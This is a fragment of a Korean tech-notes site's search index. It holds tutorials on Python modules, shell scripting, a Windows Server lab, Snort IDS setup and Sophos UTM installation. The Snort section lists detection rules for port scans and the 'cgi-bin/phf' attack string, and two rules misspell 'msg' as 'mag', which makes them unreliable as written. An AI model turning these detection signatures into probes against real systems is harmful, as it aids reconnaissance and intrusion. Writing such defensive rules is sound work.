출력한다. 위 예에서 볼 수 있듯이 time.sleep 함수의 인수는 실수 형태를 쓸 수 있다. 즉 1이면 1초, 0.5면 0.5초가 되는 것이다.\ncalendar calendar는 파이썬에서 달력을 볼 수 있게 해주는 모듈이다.\ncalendar.calendar(연도)로 사용하면 그해의 전체 달력을 볼 수 있다. 결괏값은 달력이 너무 길어 생략하겠다.\n   import calendar print(calendar.calendar(2015)) calendar.prcal(연도)를 사용해도 위와 똑같은 결괏값을 얻을 수 있다.\n      calendar.prcal(2015) 다음 예는 2015년 12월의 달력만 보여 준다.\n      calendar.prmonth(2015, 12) December 2015 Mo Tu We Th Fr Sa Su 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 calendar.weekday\n   calendar 모듈의 또 다른 유용한 함수를 보자. weekday(연도, 월, 일) 함수는 그 날짜에 해당하는 요일 정보를 돌려준다. 월요일은 0, 화요일은 1, 수요일은 2, 목요일은 3, 금요일은 4, 토요일은 5, 일요일은 6이라는 값을 돌려준다.\n   calendar.weekday(2015, 12, 31) 3 위의 예에서 2015년 12월 31일은 목요일임을 보여 준다.\n   calendar.monthrange\nmonthrange(연도, 월) 함수는 입력받은 달의 1일이 무슨 요일인지와 그 달이 며칠까지 있는지를 튜플 형태로 돌려준다.\n   calendar.monthrange(2015,12) (1, 31) 위 예는 2015년 12월 1일은 화요일이고, 이 달은 31일까지 있다는 것을 보여 준다.\n   날짜와 관련된 프로그래밍을 할 때 위 2가지 함수는 매우 유용하게 사용된다.\n  random random은 난수(규칙이 없는 임의의 수)를 발생시키는 모듈이다. random과 randint에 대해 알아보자.\n다음은 0.0에서 1.0 사이의 실수 중에서 난수 값을 돌려주는 예를 보여 준다.\n   import random random.random() 0.53840103305098674 다음 예는 1에서 10 사이의 정수 중에서 난수 값을 돌려준다.\n      random.randint(1, 10) 6 다음 예는 1에서 55 사이의 정수 중에서 난수 값을 돌려준다.\n      random.randint(1, 55) 43 random 모듈을 사용해서 재미있는 함수를 하나 만들어 보자.\n   random_pop.py import random def random_pop(data): number = random.randint(0, len(data)-1) return data.pop(number)\nif name == \u0026ldquo;main\u0026quot;: data = [1, 2, 3, 4, 5] while data: print(random_pop(data)) 결과값: 2 3 1 5 4 위 random_pop 함수는 리스트의 요소 중에서 무작위로 하나를 선택하여 꺼낸 다음 그 값을 돌려준다. 물론 꺼낸 요소는 pop 메서드에 의해 사라진다.\nrandom_pop 함수는 random 모듈의 choice 함수를 사용하여 다음과 같이 좀 더 직관적으로 만들 수도 있다.\ndef random_pop(data): number = random.choice(data) data.remove(number) return number random.choice 함수는 입력으로 받은 리스트에서 무작위로 하나를 선택하여 돌려준다.\n리스트의 항목을 무작위로 섞고 싶을 때는 random.shuffle 함수를 사용하면 된다.\n   import random data = [1, 2, 3, 4, 5] random.shuffle(data) data [5, 1, 3, 4, 2]\n   [1, 2, 3, 4, 5] 리스트가 shuffle 함수에 의해 섞여서 [5, 1, 3, 4, 2]로 변한 것을 확인할 수 있다.\n  webbrowser webbrowser는 자신의 시스템에서 사용하는 기본 웹 브라우저를 자동으로 실행하는 모듈이다. 다음 예제는 웹 브라우저를 자동으로 실행하고 해당 URL인 google.com으로 가게 해 준다.\n   import webbrowser webbrowser.open(\u0026ldquo;http://google.com\u0026rdquo;) webbrowser의 open 함수는 웹 브라우저가 이미 실행된 상태라면 입력 주소로 이동한다. 만약 웹 브라우저가 실행되지 않은 상태라면 새로 웹 브라우저를 실행한 후 해당 주소로 이동한다.\n   open_new 함수는 이미 웹 브라우저가 실행된 상태이더라도 새로운 창으로 해당 주소가 열리게 한다.\n   webbrowser.open_new(\u0026ldquo;http://google.com\u0026rdquo;) [스레드를 다루는 threading 모듈]\n   스레드 프로그래밍은 초보 프로그래머가 구현하기에는 매우 어려운 기술이다. 여기에 잠시 소개했으니 눈으로만 살펴보고 넘어가자.\n컴퓨터에서 동작하고 있는 프로그램을 프로세스(Process)라고 한다. 보통 1개의 프로세스는 한 가지 일만 하지만 스레드(Thread)를 사용하면 한 프로세스 안에서 2가지 또는 그 이상의 일을 동시에 수행할 수 있다.\n간단한 예제로 설명을 대신하겠다.\nthread_test.py import time\ndef long_task(): # 5초의 시간이 걸리는 함수 for i in range(5): time.sleep(1) # 1초간 대기한다. print(\u0026ldquo;working:%s\\n\u0026rdquo; % i)\nprint(\u0026ldquo;Start\u0026rdquo;)\nfor i in range(5): # long_task를 5회 수행한다. long_task()\nprint(\u0026ldquo;End\u0026rdquo;) long_task 함수는 수행하는 데 5초의 시간이 걸리는 함수이다. 위 프로그램은 이 함수를 총 5번 반복해서 수행하는 프로그램이다. 이 프로그램은 5초가 5번 반복되니 총 25초의 시간이 걸린다.\n하지만 앞에서 설명했듯이 스레드를 사용하면 5초의 시간이 걸리는 long_task 함수를 동시에 실행할 수 있으니 시간을 줄일 수 있다.\n다음과 같이 프로그램을 수정해 보자.\nthread_test.py import time import threading # 스레드를 생성하기 위해서는 threading 모듈이 필요하다.\ndef long_task(): for i in range(5): time.sleep(1) print(\u0026ldquo;working:%s\\n\u0026rdquo; % i)\nprint(\u0026ldquo;Start\u0026rdquo;)\nthreads = [] for i in range(5): t = threading.Thread(target=long_task) # 스레드를 생성한다. threads.append(t)\nfor t in threads: t.start() # 스레드를 실행한다.\nprint(\u0026ldquo;End\u0026rdquo;) 이와 같이 프로그램을 수정하고 실행해 보면 25초 걸리던 작업이 5초 정도에 수행되는 것을 확인할 수 있다. threading.Thread를 사용하여 만든 스레드 객체가 동시 작업을 가능하게 해 주기 때문이다.\n하지만 위 프로그램을 실행해 보면 \u0026ldquo;Start\u0026quot;와 \u0026ldquo;End\u0026quot;가 먼저 출력되고 그 이후에 스레드의 결과가 출력되는 것을 확인할 수 있다. 그리고 프로그램이 정상 종료되지 않는다. 우리가 기대하는 것은 \u0026ldquo;Start\u0026quot;가 출력되고 그다음에 스레드의 결과가 출력된 후 마지막으로 \u0026ldquo;End\u0026quot;가 출력되는 것이다.\n이 문제를 해결하기 위해서는 다음과 같이 프로그램을 수정해야 한다.\nthread_test.py import time import threading\ndef long_task(): for i in range(5): time.sleep(1) print(\u0026ldquo;working:%s\\n\u0026rdquo; % i)\nprint(\u0026ldquo;Start\u0026rdquo;)\nthreads = [] for i in range(5): t = threading.Thread(target=long_task) threads.append(t)\nfor t in threads: t.start()\nfor t in threads: t.join() # join으로 스레드가 종료될때까지 기다린다.\nprint(\u0026ldquo;End\u0026rdquo;) 스레드의 join 함수는 해당 스레드가 종료될 때까지 기다리게 한다. 따라서 위와 같이 수정하면 우리가 원하던 출력을 보게 된다.\n"}),a.add({id:38,href:'/docs/system/window/window01/',title:"Roadmap",content:"Windows Sever Roadmap   Windows Sever Roadmap    Windows Server을 사용하기 위한 준비\n  응용 프로그램 : VMware workstation\n  가상머신의 종류와 하드웨어 사양\n       FIRST SECOND THIRD Windows Client SERVERCORE     주 용도 서버 전용 서버/ 클라이언트 겸용 서버/ 클라이언트 겸용 클라이언트 전용 서버 코어 테스트 용도   Guest OS 종류 Windows Server 2016 Windows Server 2016 Windows Sever 2016 Windows Sever 2016 Windows Sever 2016   가상머신 FIRST SECOND THIRD WINCLIENT SEVERCORE   CPU 코어수/ 쓰레드 1/2 1/2 1/2 2/2 1/2   하드용량 100GB 60GB 60GB 60GB 60GB   메모리 할당 2048MB 2048MB 2048MB 2048MB 2048MB   네트워크 타입 NAT NAT NAT NAT NAT   CD/DVD O O O O O   Audio X X X O X   USB X X X O X   Printer X X X O X       가상머신의 네트워크       FIRST SECOND THIRD WINCLIENT SEVERCORE     IP 주소 192.168.10.11 192.168.10.12 192.168.10.13 DHCP 192.168.10.50   Subnet mask 255.255.255.0 255.255.255.0 255.255.255.0 DHCP 255.255.255.0   Gateway 192.168.10.2 192.168.10.2 192.168.10.2 DHCP 192.168.10.2   DNS 192.168.10.2 192.168.10.2 192.168.10.2 DHCP 192.168.10.2        Network Topology       Roadmap     "}),a.add({id:39,href:'/docs/development/shell/',title:"Shell Script",content:"Shell Script    Shell Script docs   Shell Script란?\n  UNIX? Linux 개념과 명령어\n  Shell Script 문법\n  UNIX/ Linux 시스템 관리\n  Shell Script System Management\n  Shell Script System Security\n  Shell Script Customizing\n        Shell Script Training   Shell Basics\n  Quotes\n  Variables\n  Funcnctions\n  Exit Status\n  etc\n  Commands\n  Test 연산자\n  SubShells\n  awk\n  sed\n  연습 매크로\n      "}),a.add({id:40,href:'/docs/development/shell/shell-1/',title:"Shell Script란?",content:"Shell Programming    Shell Script의 개요   UNIX/ Linux 소개 및 특징   UNIX   1969년 AT\u0026amp;T 벨연구소의 직원이 켄 톰슨, 데니스 리치, 더글라스 매클로리 등이 최초로 개발하였으며, 이후 C언어로 재작성되어 다양한 플랫폼에 이식될 수 있도록 보완되었다\n  벨연구소는 대학과 연구기관에 UNIX를 활용할 수 있도록 라이선스를 제공하였으며, 버클리 대학교에서는 UNIX에 네트워크 프로토콜인 TCP/IP 등 다양한 기능을 보강하여 BSD 배포본을 제작하고 이후 파생되는 많은 UNIX에 영향을 끼쳤다.\n      Linux   1991년 리누스 토발즈라는 핀란드 헬싱키 대학의 대학원생에 의해 커널이 개발된 이래, 1984년부터 리처드 스토람에 의해 추진된 GNU 프로젝트의 다양한 소프트웨어들이 합쳐진 운영체제가 Linux이다.\n  개인용 데스크톱 환경뿐만 아니라 안드로이드 등 스마트폼에서부터 기업용 엔터프라이즈 환경에 이르기까지 다양한 플랫폼에 이식되어 활용중이다.\n  대표적인 리눅스 배포판에는 데비안, 레드햇, 슬렉웨어, SUSE, 우분투, 젠투가 있으며 그밖에도 다양한 배포본들이 파생되어 개발되고 있다.\n       쉘의 역할 및 특징    쉘은 운영체제에서 커널(Kernel)과 사용자 사이의 인터페이스, 즉 가교 역할을 하는 프로그램으로, 운영체제의 내부 명령어나 응용프로그램을 실행하는 것을 지원\n  시스템을 전체적으로 보면 운영체제는 결국 하드웨어의 한 부분인 저장장치의 일부에 저장\n  운영체제를 좀 더 세부적으로 살펴보면, 운영체제가 설치되어 있는 저장장치(DISK 등)를 비롯하여 모니터, 그래픽카드, NIC 등 시스템에 직간접적으로 연결되는 하드웨어를 통제하는 커널과 이러한 커널과 사용자 및 응용 프로그램 사이에서의 명령을 전달을 담당하는 쉘로 구분\n  운영체제 마다 기본적으로 다양한 쉘을 제공하고 있고 사용자가 별도의 쉘을 설치해서 활용\n  CDE(Common Desktop Environment)\n 공통 데스크톱 환경(CDE)은 유닉스를 위한 그래픽 데스크톱 환경이며 모티프 위젯 툴킷을 도입하고 있다. 유닉스 표준화 단체들 가운데 하나인 공통 개방형 소프트웨어 환경이 지정한 유닉스 GUI 규격이다.       Shell의 종류     구분 개발자 설치 위치 설명     sh Stephen Bouren /bin/sh 대부분의 UNIX 및 Linux에 설치되어 있는 쉘   bash Brain, Chet Ramey /bin/bash Linux의 기본 쉘로 sh와 호환   ksh David Kron /bin/ksh 1980년대 밸 연구서에서 개발, 부동 소수점 계산이 가능   csh Bill Joy /bin/csh C언어와 비슷한 스타일로 Script를 작성 가능   tcsh Ken Greer /bin/tcsh csh에 커맨드 히스토리 등 추가 기능을 보완      Shell 종류 확인 명령어  $ ps -p $$ $ tail /etc/passwd user01:x:500:500::/home/user01:/bin/bash # 마지막 필드에 기술된 쉘의 경로를 통해 확인가능 $ /bin/bash --version GNU bash, version 5.0.17(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2019 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.    Shell Script    컴퓨터 사용의 편의성을 확보한 GUI 기반의 실행 환경인 Windows 초기 버전이 있었지만 DOS를 통해 구동되는 DOS의 확장 프로그램 수준이었기 때문에 일반 사용자가 쉽게 사용하기에는 어려움이 있었다.\n  이러한 번거로움을 조금이나마 해소하고자 DOS 구성 시 메모리 구성 및 드라이버 로딩을 케이스별로 메뉴로 구성하여 케이스별로 선택할 수 있는 배치 파일을 만들어 활용하는 사람들이 있었다.\n  그 당시의 배치 파일을 지금의 쉘 스크립트와 비슷한 개념으로 이해하면 된다.\n  쉘 스크립트 : 운영체제의 쉘에서 사용할 수 있는 명령어를 해석하고 그 결과를 커널에게 전달하는 프로그램\n  쉘 : 사용자가 내린 명령어를 해석하고 그 결과를 커널에게 전달하는 프로그램\n     쉘 스크립트 활용 시 이점   반복 작업에 대한 자동화 기능   쉘 스크립트를 활용하는 가장 큰 장점은 관리자의 번거로움을 덜 수 있다.\n  스케줄 설정과 같이 주기적으로 수행하는 단순한 작업에 단순한 작업에 쉘 스크립트를 활용하면 관리자가 일일이 타이핑하지 않아도 된다.\n       기존의 명령어를 사용자만의 명령어로 보완   기본적으로 UNIX/Linux는 POSIX라는 표준 규약을 준수하지만 모든 명령어가 통일된 것은 아니기 때문에 운영체제 마다 명령 옵션이나 결과 형식에 약간의 차이가 있다.\n  운영체제에서 제공하는 명령어 실행 결과를 사용자가 원하는 형식으로 재구성해야 할 때가 있다.\n  예시\n  운영체제가 다른 시스템에서 동일한 형태의 로그를 추출해야 할 때가 있다.\n  이 경우, 쉘 스크립트를 이용하여 기존의 명령어의 결과를 원하는 형태의 결과로 표시할 수 있다.\n  이를 위해 입출력 재지정(Rdirection)을 활용\n         손쉽고 빠른 개발 및 보완이 가능   기본적으로, 쉘 스크립트 자체는 운영체제의 명령어 등을 묶어서 프로그램화한 후 인터프리터 방식으로 수행되기 때문에 별도의 컴파일러를 설치할 필요가 없다.\n  운영체제의 명령어들을 잘 알고 있다면 손쉽고 빠른 개발 및 보완이 가능\n  필요한 절차를 기술하는 것\n  시스템 관리자가 관리하는 여러 대의 서버 및 원격지에 있는 서버를 설정하거나 패치할 때 쉘 스크립트를 활용하면 설정 및 패치 작업을 보다 더 효율적으로 할 수 있다.\n       POSIX(Portable Operating System Interface)    서로 다른 UNIX OS의 공통 API를 정리하여 이식성이 높은 유닉스 응용 프로그램을 개발하기 위한 목적으로 IEEE가 책정한 어플리케이션 인터페이스 규격\n  대부분의 시스템들이 AT\u0026amp;T에서 개발된 UNIX에 뿌리를 두고 있지만 시간이 흐르면서 다양한 제조사와 개발자의 손을 거치면서 운영체제별 의존성 문제가 발생\n  POSIX는 운영체제별 의존성 문제를 해결하기 위해 서로 다른 UNIX 운영체제에서 공통 API를 정리하여 운영체제간 이식성이 높은 UNIX 응용 프로그램을 개발하기 위한 목적으로 제정된 API 규격\n     Shell Script 학습 환경 구축   기본적인 준비 프로그램   x86에 설치되지 않는 UNIX/Linux 버전은 사용이 불가능하다.(IMB의 AIX, HP의 HP-UX, SUN의 SPARC CPU 버전 Solaris 등)\nVMware 또는 VirtualBox 설치\n기본 용량 cpu 1/1, ram 1GB, HDD 8GB(VDI, 동적할당)\nPuTTY를 통해 ssh 접속\nPuTTY의 문자를 UTF-8로 변경\n  운영체제 이미지 파일 다운로드     구분 운영체제/ 배포본 웹 사이트 주소     UNIX solaris http://www.oracle.com/kr/index.html     FreeBSD http://www.freebsd.org/     NetBSD http://www.netbsd.org/     OpenBSD http://www.openbsd.org/   UNIX ubuntu http://www.ubuntu.com/index_roadshow     fedora http://getfedora.org/     CentOS http://www.centos.org/     KALI linux https://www.kali.org/     SUlinux https://www.sulinux.net/2014/      "}),a.add({id:41,href:'/docs/network/snort/snort-01/',title:"Snort란?",content:"Snort를 이용한 IDS/IPS 구축   침입 탐지 시스템(IDS) \u0026ndash; Snort  Snort   Snort란 일종의 침입탐지시스템(IDS:Intrusion Detection System)으로 실시간 트래픽 분석, 프로토콜 분석, 내용검색/매칭, 침입탐지 Rule에 의거하여 오버플로우, 포트스캔, CGI공격, OS확인 시도 등의 다양한 공격과 스캔을 탐지할 수 있다. 침입탐지 Rule은 보안 커뮤니티를 통해 지속적으로 업데이트되고 또한 사용자가 직접 Rule을 작성하여 추가할 수 있도록 설계되어 최신공격에 대한 적응에 빨리 대처하는 오픈소스 서비스     Snort의 주 기능  탐지(Detection) 잘못된 패킷을 감지하면 사용자에게 알림(주체적으로 처리하지 X, only 안내)     **Snort 탐지의 종류 **     종류 역할     오용 탐지 알고 있는 것 탐지   이상 탐지 모르는 것도 탐지(100% 탐지 X)     너무 민감하게 처리하면 필요한 정보도 차단하는 실수를 할 수 있음     Snort 설치위치에 따른 역할 ( 성능이 달라짐 )   패킷이 라우터로 들어오기 전  내부 네트워크로 들어오는 모든 패킷은 IDS를 거침 쓸 데 없는 패킷을 많이 훑기 때문에 효율적이지 X 일반적으로 정상적인 패킷이 더 많음     라우터 뒤    라우터의 패킷 필터링을 거친 패킷을 검사 라우터 전보다는 성능저하 덜 적음 but, 공격 패킷 탐지는 낮아질 수 있음   방화벽 뒤    일반적으로 2, 3, 4계층 패킷을 거름(5, 6, 7계층도 거름)   내부 네트워크    내부의 클라이언트를 신뢰할 수 없어 내부 네트워크 해킹을 감시하려 할 때 설치 내부 네트워크에 대한 해킹 피해를 방지하기 위해     Snort 설치  CentOS 7  의존성 관련 프로그램 설치   $ yum -y install http://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/d/daq-2.0.6-1.el7.x86_64.rpm $ yum -y install gcc gcc-c++ flex bison zlib libpcap pcre libdnet tcpdump $ yum -y install ftp://ftp.pbone.net/mirror/archive.fedoraproject.org/epel/7/x86_64/Packages/l/libnghttp2-1.31.1-1.el7.x86_64.rpm  Snort 설치   mkdir /[ doc ] cd /[ doc ] $ wget http://ftp.psu.ac.th/pub/snort/libdnet-1.12.tgz $ tar zxvf libdnet-1.12.tgz $ cd libdnet-1.12 $ ./configure $ make $ make install    Ubuntu18.04  $ apt-get -y update $ apt-get -y upgrade $ apt-get install snort  rpm을 통한 Snort 공통 설치    Snort 다운로드   - wget https://www.snort.org/downloads/snort/snort-2.9.16-1.centos7.x86_64.rpm - rpm -ivh snort....    스노트 기본 설정   /etc/snort/snort.conf 파일에서 기존의 룰 제거    dynamicdetection directory /usr/local/lib/snort_dynamicrules \u0026ndash;\u0026gt; # dynamicdetection directory /usr/local/lib/snort_dynamicrules   511번, 512번 줄 맨 앞에 # 추가   whitelist $WHITE_LIST_PATH/white_list.rules, \\ \u0026ndash;\u0026gt; # whitelist $WHITE_LIST_PATH/white_list.rules, \\ blacklist $BLACK_LIST_PATH/black_list.rules \u0026ndash;\u0026gt; # blacklist $BLACK_LIST_PATH/black_list.rules   548번, 651번 줄까지 맨 앞에 # 추가 or 삭제    include \u0026hellip;\u0026hellip; \u0026ndash;\u0026gt; # include\n  cd /etc/snort/rules\n  vi local.rules\n  alert icmp any any -\u0026gt; any any ( msg:\u0026ldquo;ICMP Detected\u0026rdquo;; sid:1000001; )\n  [액션][프로토콜][출발지IP][출발지포트]	[목적지IP][목적지포트]	[옵션]\n   snort 실행   snort -c /etc/snort/snort.conf -i ens33   snort 실행확인    tail -f /var/log/snort/alert\n  *tip : snort.log로 시작하는 파일은 문서 파일이 아닌 실행 파일\n  snort 종료하면 나오는 보고서 형식으로 작성됨\n  snort -r 옵션으로 해당 파일을 볼 수 있음\n     Snort rules  Rule 형태 [RuleHeader] [tcp, udp, icmp, ip] [출발지IP] [포트] [-\u0026gt;, \u0026lt;\u0026gt;] [도착지IP] [포트] [RuleOption] ex) alert icmp any any -\u0026gt; any any ( msg:\u0026#34;ICMP Detected\u0026#34;; sid:1000001; )    Rule Header   Rule Action      Rule Header Action     **alert ** 룰에 일치하는 경우 경고를 발생 시키고 로그로 기록한다.   **log ** 로그로 기록한다.   **pass ** 패킷을 무시한다.   **drop ** 패킷을 차단하고 로그로 남긴다.   **reject ** 패킷을 차단하고 로그로 남긴다, 그리고 tcp 패킷의 경우 rst 패킷을 응답하고 udp 패킷의 경우 icmp unreachable 패킷으로 응답한다.   **sdrop ** 패킷을 차단하고 로그를 남기지 않는다.       프로토콜   TCP, UDP, ICMP, IP     IP 주소    any는 모든 IP\n  논리부정연산자(!) 사용 가능\n  여러 IP주소에 대한 표기 [] 사용, 콤마(,)로 구분\n  ex) !192.168.1.0/24 ![192.168.1.0/24,10.1.1.0/24]\n     포트 번호    1:1024 = 1 ~ 1024\n  :1024 = 1024 port 이하\n  1024: = 1024 port 이상\n  !1:1024 = 1 ~ 1024 port를 제외한 나머지\n     패킷 방향   -\u0026gt; outgoing 패킷 \u0026lt;- 존재하지 않는다 \u0026lt;\u0026gt; 양방향  Rule Option    Rule Option은 새미콜론(;)으로 구분한다.\n  general : 룰에 대한 정보를 포함하는 옵션\n  msg : alert 엔진을 통해 전달하는 메시지를 설정할 수 있다.\n  ex) msg:\u0026quot;\u0026quot;;\n  sid : Snort ID의 약자로 룰을 식별하기 위해 사용된다.\n  ex)sid:;\n  payload : 패킷 내 페이로드 내부의 데이터를 찾고 상호작용을 할 수 있는 옵션\n  content : 페이로드 내 존재하는 특정 문자열이나 헥스 값 등을 판별하여 룰에 영향을 줄 수 있다. 사실상 가장 많이 쓰일 것 같다. 헥스 값의 경우 ‘|’ 으로 감싸주어 사용 가능하다.\n  ex)content :[!]\u0026quot;\u0026quot;;\n  depth : 지정된 패턴을 검색 시 패킷의 길이를 지정할 수 있다. depth가 5인 경우 페이로드의 처음 5바이트 내에서 지정된 패턴을 찾는다. offset 키워드와 함께 사용 가능하다.\n  offset : depth와 비슷하며 함께 자주 쓰인다. 말 그대로 해당 오프셋부터 패턴을 검색한다. offset이 5인 경우 offset 5부터 지정된 패턴을 검색한다.\n  ex) alert tcp any any -\u0026gt; any 80 (content:\u0026ldquo;cgi-bin/phf\u0026rdquo;; offset:4; depth:20;)\n  80(http/tcp)로 접근하는 모든 패킷의 offset 4부터 20바이트 내 cgi-bin/phf 문자열이 존재하는지 확인한다.\n  non-payload : 페이로드가 없는 데이터에서 사용\n  fragoffset : IP Fragment 오프셋 필드의 값을 비교할 수 있다.\n  ex)fragoffset:[!]\u0026lt;|\u0026gt;];\n  ttl : TTL(Time To Live) 항목이다. traceroute 명령어를 탐지하기 위한 키워드이다.\n  ex)ttl:[\u0026lt;,\u0026gt;,=,\u0026lt;=,\u0026gt;=]; , ttl:[]-[\u0026lt;number];\n  fragbits : 단편화된 패킷이거나 IP Header 내 flags 필드에 비트가 설정되어 있는지 확인하는데 사용된다.\n  ex)fragbits:MD+; More Fragments bit \u0026amp; Don’t Fragments bit\n  flags : TCP flag 비트를 확인하는데 사용한다. 기본적으로 UAPRSF(URG, ACK, PSH, RST, SYN, FIN)를 확인할 수 있고, 추가적으로 CWR, ECE 를 사용할 수 있다.\n  ex) alert tcp any any -\u0026gt; any any (flags:SF;) 모든 패킷에 SYN과 FIN 패킷을 탐지한다.\n  탐지 가능한 공격 : X-Mas 스캔, Null 스캔\n  X-Max 스캔\n  alert tcp any any -\u0026gt; any any (mag:\u0026#34;X-Max Scan Detected!!\u0026#34;; flags:FPU; sid:1000004;)  Null 스캔  alert tcp any any -\u0026gt; any any (mag:\u0026#34;Null Scan Detected!!\u0026#34;; flags:0; sid:1000005;)  threshold 옵션 : 행위기반 탐지가 가능한 옵션 track by_src : 동일한 출발지에서 track by_dst : 동일한 목적지로  threshold:type threshold, limit, both # 패킷량, 임계시간 임계시간 단위당 로그 발생량   count : 수\n  seconds : 초\n  seq : TCP sequence number를 확인한다.\n  ex) seq:0;\n  ack : TCP acknowledge number를 확인한다.\n  ex) ack:0;\n  Post-detection : 사후탐지에 대한 옵션, 룰 실행 후의 규칙\n  react : 패킷을 차단하거나 경고 메시지를 출력한다.\n  react:block; : 패킷을 차단한다\n  ARP 탐지 추가\n  vi /etc/snort/snort.conf ARP spoot 수정 preprocessor arpspoof_detect_host: [ IP 주소 ] [ MAC 주소 ]\n  preprocessos : snort.conf 파일에 설정하는 전처리 기능\n  itype : ICMP Type 지정\n  icode : ICMP Type의 Code 지정\n  ICMP Redirect 탐지, ICMP 요청만 탐지\n     Snort 사용법 "}),a.add({id:42,href:'/docs/network/sophos/sophos_0/',title:"Sophos",content:"Sophos  Sophos UTM ( United Threat Management )    Sophos UTM이란 Sophos사에서 리눅스 커널을 이용해 만든 UTM장비\n  UTM : Anti Virus, Firewall, IPS ( 침입방지시스템 ) , VPN , IDS ( 침입탐지시스템 )등의 보안기능 중 적어도 2개, 많게는 7~8가지 기능을 하나의 장비에 포함하여 사용하는 통합보안장비\n    통합위협관리시스템( UTM )의 주요 기능     기능 설명     Firewall Stateful Packet Inspection( SPI ) Firewalld, SMTP, HTTP, POP3, DNS, Proxy 기능이 결합된 견고한 network보안 구축   VPN IPsec VPN(DES/3DES) 및 L2TP VPN 지원   IDS/ IPS 다양한 network 기반 공격 탐지 및 차단, 다양한 Application 기반 공격 탐지 및 차단, Anomaly Detection, Dos/DDos,   Anti-Scan Attack Scan Attack 기반 공격 탐지 및 차단   Anti Virus 이메일 기반 내/외부 유입 바이러스 탐지 및 차단, Web 기반 내/외부 유입 바이러스 탐지 및 차단   Anti-Spam 베이시안(Baysian) 알고리즘 기반 스팸메일 탐지 및 차단, 점수(Score) 데이터 기반 스팸 메일 탐지 및 차단   Content Filtering 유해사이트 및 정책 위배 웹사이트 접근 탐지 및 차단   ext Transparent/Router/NAT 모드 지원, 피싱 차단 및 SIP Proxy 기능 제공      Sophos UTM 메뉴의 역할     메뉴 역할     Webserver Protection WAF ( Web Application Firewall ) Web Hacking 방어   Support Tools ping test, traceroute   Network Protection NAT Masquerding PAT   Network Protection Firewall Country Blocking 특정 국가에서 들어오는 트래픽을 차단   Network Protection Firewall ICMP Ping 허용/차단 설정용도 ( ping settings에 \u0026lsquo;Gateway forward pings를 허용해줘야 내부에서 외부로 ping이 전송 )   Network Protection Firewall Advanced Connection tracking helpers FTP Stateful기능 사용여부   Web Protection Client를 외부로부터 보호하는 역할 ( 사용자 보호하는 것으로 웹서버 보호 X )   Web Protection - Web Filtering    Standard Mode Client측 장비한테 UTM장비에게 가라고 지정을 해줘야지만 UTM장비에서 검사 ( default : 외부로 전송 )   Transparent Mode 별도로 UTM장비에게 가라고 지정하지 않아도 UTM장비가 검사      "}),a.add({id:43,href:'/docs/network/sophos/sophos_1/',title:"Sophos 설치",content:"Sophos 설치    구성환경    Sophos는 nat을 외부대역으로 Host 2 ( 20.20.20.0/24 )를 내부대역으로 갖습니다. Sophos의 설치를 위해 내부 대역 ( Host 2 )의 Win 7을 통해 설치를 진행합니다.      Sophos 설치를 위한 Vm을 설정합니다.       운영체제 버전에서 Other Linux 2.6x kernel을 선택합니다. 그 후 RAM 1G 디스크 20G 외에는 기본 값으로 진행합니다.      위 그림과 같이 설정이 생성이 완료되면 설정을 위해 Edit virtual machine settings를 클릭합니다.      위 그림과 같이 세팅을 마무리 합니다. CD/DVD에 sophos 이미지 파일의 경로를 지정합니다. 네트워크 어뎁터를 추가로 설정합니다. 여기서는 Nat와 Host 2 ( 20.20.20.0/24 )를 설정하였습니다.      가상머신을 시작하면 설치화면이 나옵니다. Enter을 눌러 설치를 진행합니다.      현재 설치하는 가상머신에 설치가 가능한지 테스트를 진행합니다.      테스트가 완료되면 설치를 진행합니다.      언어와 시간을 선택합니다. ( 영어로 선택하시면 됩니다. )      내부대역 네트워크 인터페이스를 선택합니다. 가상머신 설정 순서대로임을 반드시 기억해주세요. 저는 위 부터 Nat, Host 2로 설정이 되어있어, Host 2 ( 하단 )를 선택했습니다.      Nat 인터페이스의 IP를 설정합니다.      설치가 완료되면 재부팅 후, 다음과 같은 화면이 출력됩니다. 그 후, https://[ IP ]/:4444/로 접속하라는 안내창이 나옵니다. 여기서 주의하실 점은 같은 대역이 아니면 접근이 불가능하다는 것을 유의하셔야 합니다.      해당 아이피의 4444번 포트로 접속하면 다음과 같은 화면이 나옵니다. 여기에서는 고급을 클릭하여 페이지로 이동합니다.      접속이 성공하면 다음과 같은 화면이 나오는 데, 설정 값들을 기입 후 진행합니다. 설정이 완료되면 로그인화면으로 이동됩니다.      초기 설정에서 입력한 값으로 로그인을 진행합니다.      초기 설정을 위해 Continue를 체크 후 진행합니다.      Licenese가 없으므로 체험판으로 진행해보도록 하겠습니다. ( 30일 무료 )      Internal Network 셋팅입니다. 이는 이미 설치 과정에서 진행하였습니다. 변동이 없다면 다음으로 진행합니다.      다음으로는 external 설정 값입니다. Network Interface에 따라 설정합니다. 인터페이스가 2개면 내부 1, 외부 1, 3개면 내부 2, 외부 1이런 방식입니다. 저는 nat, Host 2을 사용하기에 여기선 Nat의 설정 값을 기입후 진행하겠습니다.      각종 프로토콜, 서비스에 대한 보안설정입니다. 여기서는 아직 셋팅하지 않으므로, 넘어가도록 하겠습니다.      최종 셋팅 값을 보여줍니다. 확인을 누르시면 설정이 완료됩니다. #xxxxxxx     Sophos의 설치가 완료되었습니다. 다음 장에서 부터는 본격적으로 Sophos를 다뤄보도록 하겠습니다.     "}),a.add({id:44,href:'/docs/development/spingboot/',title:"Sping Boot",content:"NCP docs    현재 정리하고 있습니다!  "}),a.add({id:45,href:'/docs/development/spingboot/spingboot01/',title:"Sping Boot0",content:"****         ****          "}),a.add({id:46,href:'/docs/development/spingboot/spingboot02/',title:"Sping Boot0",content:"****         ****          "}),a.add({id:47,href:'/docs/development/spingboot/spingboot03/',title:"Sping Boot0",content:"****         ****          "}),a.add({id:48,href:'/docs/development/spingboot/spingboot04/',title:"Sping Boot0",content:"****         ****          "}),a.add({id:49,href:'/docs/aws/awssaa/saa-2/',title:"2장 EC2와 EBS",content:" 2장 Amazon Elastic Compute Cloud와 Amazon Elastic Block Store  2장의 목표  복원력은 갖춘 아키텍처 설계  안정적이고, 복원력을 갖춘 스토리지를 선택 어떻게 고가용성 및/ 또는 내결함성을 갖춘 아키텍처를 설계할지를 결정      성능이 뛰어난 아키텍처 정의  성능이 뛰어난 스토리지 및 